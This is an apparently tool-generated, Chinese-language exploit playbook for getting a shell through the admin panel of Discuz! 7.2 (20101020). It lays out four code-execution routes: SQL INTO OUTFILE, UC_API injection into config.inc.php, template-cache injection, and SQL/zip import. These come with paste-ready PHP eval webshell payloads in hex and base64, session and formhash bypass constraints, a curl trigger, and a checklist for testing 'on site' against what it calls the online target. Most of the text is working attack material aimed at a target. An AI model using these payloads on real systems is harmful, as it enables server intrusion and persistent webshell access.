# Discuz! 7.2 RELEASE 20101020 后台 Getshell 全路径（离线白盒审计手册）

- **code**: discuz-7.2-release-20101020-后台-getshell-全路径-离线白盒审计手册
- **kind**: exp
- **category**: rce
- **component**: Discuz 7.2 后台
- **versions**: Discuz! 7.2 RELEASE 20101020（含 uc_client 1.5.1 / uc_server）
- **severity**: critical
- **language**: http
- **source**: self
- **verified_note**: 仅完成离线白盒审计：全部结论来自本地源码 C:\Users\user\Desktop\168\_src\x\discuz-master（discuz_version.php 确认 7.2 / 20101020，与线上目标一致），逐行核对了入口、权限判定、参数名、编译/写入逻辑与过滤条件。尚未在任何真实目标上执行验证，故 verified=false。
- **path**: pocs/discuz-7.2-release-20101020-后台-getshell-全路径-离线白盒审计手册/poc.http
- **tags**: discuz,7.2,getshell,后台,into outfile,模板编译,uc_key,config.inc.php,sql执行
- **created_at**: 2026-09-30T13:48:16.302Z
- **found_by**: vuln-scan

## 描述

Discuz! 7.2 后台获取服务器权限的四条路径，全部来自本地源码逐行审计（版本 7.2 RELEASE 20101020）。含 checkip 操作约束、formhash 规则、isfounder 门槛，以及每条路径的入口/参数/payload/落地物/触发方式/源码行号。

【0. 两条硬约束（源码已核实）】
0.1 checkip=1 时：include/target86.example.com:86-98 决定 $onlineip 优先取 Client-IP 头 → admin/target87.example.com:46,79-80 用 "AND ip='$ip'" 精确匹配完整 IP。IP 变了会查不到会话 → 走 creatsession() → cpaccess=1 → 退回"要求重输管理员密码"（不会锁号、不加 errorcount）。⇒ 整场后台操作所有请求必须带同一个 Client-IP 头，且与登录时一致。
0.2 formhash：include/target88.example.com:1170-1213。runquery/templates edit 必须 POST + formhash + Referer 同域；db&operation=import 用 submitcheck('importsubmit',1) 即 allowget=1 ⇒ 免 formhash。

【落点 1（首选）】后台 SQL 执行 → SELECT ... INTO OUTFILE 写马
入口：POST /example.com?action=db&operation=runquery
前置：isfounder()（example.com:86，action=db 只对创始人开放）+ $admincp['runquery']=1（admin/target88.example.com:52-60 checkpermission）
字段：formhash=xxx&sqlsubmit=1&option=&queries=<SQL>
payload：SELECT 0x3c3f70687020406576616c28245f504f53545b315d293b3f3e INTO OUTFILE '/home/target97.example.com/forumdata/templates/aa.php'
（hex = <?php @eval($_POST[1]);?>` ；用 hex 可绕开 admin/target89.example.com:675 的 stripslashes 与 WAF 引号规则）
落地：/home/target97.example.com/forumdata/templates/aa.php
触发：POST /forumdata/templates/aa.php  body: 1=id
源码：admin/target89.example.com:610-686（runquery 主体，671-675 foreach 逐条 $db->query()，全无关键词过滤）；:1289-1303 splitsql（只在 ";\n" 处拆分 ⇒ 堆叠必须分号紧跟换行，且段内换行会被拼掉）；include/db_mysql.target90.example.com:55-79
写冰蝎/哥斯拉马：SELECT 0x<马文件hex> INTO OUTFILE '/home/target97.example.com/forumdata/templates/bx.php'（xxd -p -c 999999 shell.php 得到单行 hex）
限制：INTO OUTFILE 要求文件不存在（每次换名）；MySQL 5.0.77 无 secure_file_priv；不走平台 example.com 那层 WAF。

【落点 2】api/uc.php + 可控 UC_KEY → 写 config.inc.php 注入 PHP
入口：GET /api/uc.php?code=<authcode(UC_KEY)>，body 为 UC XML
前置：UC_KEY 可在后台读取/修改（example.com?action=settings&operation=uc → admin/target91.example.com:1165-1207 写入 config.inc.php 的 UC_KEY）；API_UPDATEAPPS 常量硬编码为 1（api/target92.example.com:16）
payload（UC_API 值）：');file_put_contents('/home/target97.example.com/forumdata/templates/aa.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='));/*
落地：/home/target97.example.com/config.inc.php（每请求 include，落地即执行）或指定路径
源码：api/target92.example.com:297-323（$UC_API = $post['UC_API'] 未转义拼进 preg_replace 的 replace 值 → 单引号逃逸）；:38-66（分发+bcode 校验）；:452-500（authcode 实现，照抄实现自签）
注意：config.inc.php 是每请求 include 的文件，改坏会 500，先备份；xml_unserialize 对含 ' / 的 item 内容解析行为需实测一次。

【落点 3】模板编辑 → 编译缓存落 PHP
入口：POST /example.com?action=templates&operation=edit&templateid=1&fn=header.htm
前置：isfounder + $admincp['tpledit']=1（admin/target93.example.com:275）+ is_writeable(目标文件)（:289，要求文件已存在）
字段：formhash=xxx&editsubmit=yes&templatenew=<原文件全文+payload>
payload（必须不含 $ 字符，否则被模板引擎改写）：
<?php file_put_contents("/home/target97.example.com/forumdata/templates/aa.php",base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=="));?>
落地：/home/target97.example.com/forumdata/templates/<STYLEID>_<TEMPLATEID>_<file>.tpl.php（默认 1_1_header_index.tpl.php / 1_1_index.tpl.php / 1_1_forumdisplay.tpl.php）
触发：GET / （必须走 Discuz 正常入口 include 模板，不能直接访问 .tpl.php —— 缓存首行是 if(!defined('IN_DISCUZ')) exit('Access Denied');，直接访问会先 exit）
源码：include/target94.example.com:28-30（fread 原文读入，无 <?php 过滤）、:62（加 exit 守卫）、:80-91（fwrite 原样落盘）；:31/49-51/77（$var_regexp 会把 $_POST['cmd'] 改写成 <?=...?> 从而破坏 payload ⇒ 必须用 base64 无 $ 写法）；admin/target93.example.com:287-291（is_writeable + $fn 过滤 ../ 和 /）、:546-553（原文写入，零内容过滤）
限制：目录受 istpldir() 限制在 ./templates/ 之下（admin/target88.example.com:16-19）。

【落点 4】SQL 导入（runquery 的等价备选）
入口1：POST /example.com?action=db&operation=importzip&importsubmit=yes&confirm=yes  （multipart，字段 importfile）
入口2：POST/GET /example.com?action=db&operation=import&from=server&datafile_server=./forumdata/<backupdir>/x.sql&importsubmit=yes
zip 内 SQL 首行必须是 Identify 头：  # Identify: eCx4LHgsbXVsdGl2b2wsMQ==   （= x,x,x,multivol,1，使 $identify[3]=='multivol'）
其后：SELECT 0x3c3f70687020406576616c28245f504f53545b315d293b3f3e INTO OUTFILE '/home/target97.example.com/forumdata/templates/aa.php';
源码：admin/target89.example.com:517（datafile_server 直接拼接无过滤）、:519-550（splitsql + foreach $db->query() 执行任意 SQL）、:349-356（importzip 把 zip 内每个 .sql 条目原文写到 ./forumdata/<backupdir>/<entry->Name>，$entry->Name 无 ../ 过滤）
未核实旁路：$entry->Name 用 NUL 截断（PHP 5.1.6 < 5.3.4 存在）写成 "aa.php\x00.sql" 可通过 /\.sql$/i 检查而在 fopen 处截断为 aa.php。

【已核实不通的路（别再花时间）】
- 插件导入语言包：admin/target95.example.com:286-291（ispluginkey 只允许字母数字下划线）+ :1432-1439（langeval 把值里单引号全转义、键里单引号全删）⇒ 无注入。
- 附件上传 getsshell：include/target96.example.com:153 的 preg_replace 会给 php/phtml/php3/jsp/asp 等加下划线前缀（x.php→x._php）⇒ 不可执行。物理路径：<$attachdir>/[forumid_N|ext_<ext>|month_<ym>|day_<ymd>|swfupload]/<ymdHi><16位md5>.<ext>（含 microtime+random，不可预判）。
- 数据库备份导出：admin/target89.example.com:119/168/188，$filename 过滤时 "." 一并被删 ⇒ 扩展名锁死 .sql。
- 模板编辑 .php：templates 下唯一的 .php 全是 *.lang.php，且 :533-545 走 key-value 重建 + addcslashes 转义 ⇒ 无法原文注入。
- settings&operation=uc 写 config.inc.php：值经 daddslashes 且无回退（include/target86.example.com:42）⇒ 单引号逃逸失败（但可用来设定 UC_KEY）。

## 用法

```
首选路径（落点 1）两步：
1) POST http://<target>/example.com?action=db&operation=runquery
   Header: Client-IP: <与后台登录时完全相同的值> ; Cookie: <后台会话> ; Referer: http://<target>/example.com?action=db&operation=runquery
   Body: formhash=<从后台页面抓>&sqlsubmit=1&option=&queries=SELECT 0x3c3f70687020406576616c28245f504f53545b315d293b3f3e INTO OUTFILE '/home/target97.example.com/forumdata/templates/aa.php'
2) POST http://<target>/forumdata/templates/aa.php   Body: 1=id   → 回显 uid=

写冰蝎/哥斯拉马：把马文件转单行 hex（xxd -p -c 999999 shell.php），替换上面 SQL 里的 0x... 部分，OUTFILE 路径换成 .../templates/bx.php。
本手册完整版（含全部源码行号与核实状态）落盘在 runs/discuz72_admin_getshell_playbook.md
```

## 正文

```
完整手册文件：C:\Users\user\Desktop\168\runs\discuz72_admin_getshell_playbook.md

=== 关键源码行号索引（全部已逐行核实）===
checkip：
  include/target86.example.com:86-98   $onlineip = Client-IP > X-Forwarded-For > REMOTE_ADDR；preg_match("/[\d\.]{7,15}/")
  admin/target87.example.com:46       _loadsession($uid,$ip,$GLOBALS['admincp']['checkip'])
  admin/target87.example.com:79-80    "AND ip='$ip'" ← 精确匹配完整 IP 字符串
  admin/target87.example.com:49-59    查不到 → creatsession() → cpaccess=1（重输密码，非锁号）
  admin/target87.example.com:103-109  creatsession() 内部先 destroy() 删旧行
  include/target86.example.com:179-193  论坛前台会话 CONCAT_WS('.',ip1..ip4)='$onlineip' 同样精确匹配
  example.com:21                  checkip 那行已被注释（IP 校验实际在 cpanel.share.php 里）

落点1 后台 SQL：
  example.com:86                  action=db / action=templates 仅 isfounder() 可访问
  admin/target89.example.com:610-686        runquery 主体
  admin/target89.example.com:612            checkpermission('runquery', 0)
  admin/target89.example.com:652            textarea name="queries"
  admin/target89.example.com:669-675        splitsql() → foreach → $db->query(stripslashes($sql),'SILENT')  无过滤
  admin/target89.example.com:1130-1134      syntablestruct 对非 CREATE TABLE 原样返回
  admin/target89.example.com:1289-1303      splitsql：explode(";\n")；逐行拼接丢换行；'#' 行被丢弃
  include/db_mysql.target90.example.com:55-79  $db->query → mysql_query 单条
  admin/target88.example.com:52-60     checkpermission()

落点2 api/uc.php：
  api/target92.example.com:16                   define('API_UPDATEAPPS', 1);
  api/target92.example.com:38-66                code 解码 / action 白名单 / $post = xml_unserialize(php://input)
  api/target92.example.com:297-323              updateapps：$UC_API=$post['UC_API'] 未转义 → preg_replace 写 config.inc.php
  api/target92.example.com:452-500              _authcode 实现（自签 code 照抄）
  admin/target91.example.com:1165-1207 settings&operation=uc → 写 config.inc.php（含 UC_KEY）

落点3 模板编译：
  include/target94.example.com:19-20   $objfile = forumdata/templates/STYLEID_ templateid_ file.tpl.php
  include/target94.example.com:28-30   fread 原文读入模板
  include/target94.example.com:31/49-51/77  $var_regexp 会改写 $_POST['x'] ⇒ payload 必须无 $
  include/target94.example.com:62      首行插入 if(!defined('IN_DISCUZ')) exit('Access Denied');
  include/target94.example.com:80-91   fwrite 原样落盘
  include/target88.example.com:1215-1233 template()；:1226 header→header_CURSCRIPT；:1227 缓存路径；:1231 checktplrefresh
  admin/target93.example.com:275       checkpermission('tpledit', 0)
  admin/target93.example.com:287-291   $fn 过滤 ../ / \ ；is_writeable 前置
  admin/target93.example.com:546-553   原文写入 templatenew（无内容过滤）
  admin/target88.example.com:16-19       istpldir 限制在 ./templates 之下

落点4 SQL 导入：
  admin/target89.example.com:119              导出文件名正则（未拦 php）
  admin/target89.example.com:168              导出 $backupfilename：str_replace 把 "." 也删了
  admin/target89.example.com:188/279/306      导出：dumpfile 锁 .sql，头部写 "# <?exit();?>"
  admin/target89.example.com:323-382          importzip
  admin/target89.example.com:328              datafile_server = basename() 拼接
  admin/target89.example.com:338              首个条目名须 .sql 结尾
  admin/target89.example.com:342-346          Identify 头解析 + confirm 绕过
  admin/target89.example.com:349-356          zip 条目原文写出到 ./forumdata/<backupdir>/<entry->Name>（无 ../ 过滤）
  admin/target89.example.com:387              submitcheck('importsubmit', 1) ← allowget=1，免 formhash
  admin/target89.example.com:517-550          from=server 打开任意相对路径 + splitsql + $db->query() 执行

落点7 插件（不通）：
  admin/target95.example.com:286-291     ispluginkey 校验 identifier
  admin/target95.example.com:307-318     写 forumdata/plugins/<id>.lang.php
  admin/target95.example.com:1432-1439   langeval：值单引号全转义、键单引号删除
  admin/target88.example.com:25-27       ispluginkey：/^[a-z]+[a-z0-9_]*$/i

落点8 附件（不通）：
  include/target96.example.com:132-155     路径规则 + preg_replace 给 php/phtml/... 加下划线前缀
  admin/target98.example.com:512/639-644/677  用户组 attachextensions 可编辑（无 php 黑名单）
  admin/target91.example.com:933        attachdir 设置项

其它写文件点：
  api/target92.example.com:264-282/284-295/338-348  写 uc_client/data/cache/*.php（var_export，安全）
  include/target99.example.com:278-298      writetocache → forumdata/cache/cache_*.php（arrayeval，未发现注入）
  admin/target100.example.com:349-356     写向导历史（<?php exit;?> 前缀，无效）
  admin/target101.example.com:142-145    仅测写权限后 unlink
  admin/target102.example.com:42              只删缓存
  admin/styles.inc.php / addons / tasks / misc / magics  全量扫描无 fwrite

=== 可直接粘贴 payload ===
一句话马原文:  <?php @eval($_POST[1]);?>
HEX:          3c3f70687020406576616c28245f504f53545b315d293b3f3e
BASE64:       PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==

落点1 queries 值:
SELECT 0x3c3f70687020406576616c28245f504f53545b315d293b3f3e INTO OUTFILE '/home/target97.example.com/forumdata/templates/aa.php'

落点3 模板插入内容（全篇不含 $）:
<?php file_put_contents("/home/target97.example.com/forumdata/templates/aa.php",base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=="));?>

落点2 UC_API 值:
');file_put_contents('/home/target97.example.com/forumdata/templates/aa.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='));/*

验证: curl -X POST -d '1=id' http://example.com/forumdata/templates/aa.php

=== 未核实清单（需现场实测一次）===
1. xml_unserialize 对 UC_API 里含 ' / 的内容的解析行为（落点2唯一变量）
2. SimpleUnzip 对含 \0 或 ../ 的 zip 条目名的解析（落点4 NUL 截断旁路是否成立）
3. Apache 是否把 .php5/.pht 等映射到 PHP 处理器（落点8旁路）
4. attachments/、uc_client/data/cache/、forumdata/* 下 PHP 是否可直接执行（落点1备选路径）
5. 目标 MySQL 账号 FILE 权限（按 MySQL 5.0.77 无 secure_file_priv 推断）
6. .lang.php 语言包键名注入能否构造出合法 PHP（落点5a旁路）
7. 目标实际 STYLEID / TEMPLATEID（默认 1/1）
8. 目标 forumfounders 是否为空（决定 isfounder 成立；adminid=1 已确认）
```
